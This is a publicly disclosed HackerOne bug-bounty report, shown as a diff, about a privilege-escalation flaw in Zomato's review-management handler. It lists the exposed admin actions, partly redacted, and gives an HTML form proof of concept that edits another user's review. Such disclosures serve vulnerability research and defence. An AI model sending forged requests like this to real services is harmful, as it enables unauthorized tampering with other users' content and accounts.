@@ -1,0 +1,54 @@
+ReportLink:https://hackerone.com/reports/300099
+WeaknessName:Privilege Escalation
+Reporter:https://hackerone.com/gerben_javado
+ReportedTo:Zomato(zomato)
+BountyAmount:300.0
+Severity:
+State:Closed
+DateOfDisclosure:29.03.2018 16:58:58
+
+Summary:
+
+#Introduction 
+The handler that controls all the ███ actions for reviews is accessible for any user. The following actions are thus being left open to anyone: 
+
+```
+get_manager_status
+read███████
+unread██████████
+████████
+feature██████
+unfeature████████
+moderate████
+unmoderate█████
+drop
+███
+send_mail
+█████████
+revoke
+mark-spam
+spam-revoke
+remove-██████
+add-█████████
+reject_reported█████████
+███████
+```
+Taken from the following [██████████]████████
+
+#POC
+This POC will use the action `██████` since it easily allows us to edit any review on Zomato.com. More severe options could be ██████ to read user info.
+
+```html
+<form action="https://www.zomato.com/██████████dashboard_handler.php" method="POST">
+      <input type="hidden" name="action" value="█████" />
+      <input type="hidden" name="review_id" value="31268525" />
+      <input type="hidden" name="review" value="Privilege+Escalation" />
+      <input type="submit" value="Submit request" />
+</form>
+```
+
+Go to https://www.zomato.com/review/QvneAY and see the review has changed.
+
+## Impact
+
+Any user is able to control all the ████ actions for the reviews section including emailing, deleting, editing and adding to ██████████.
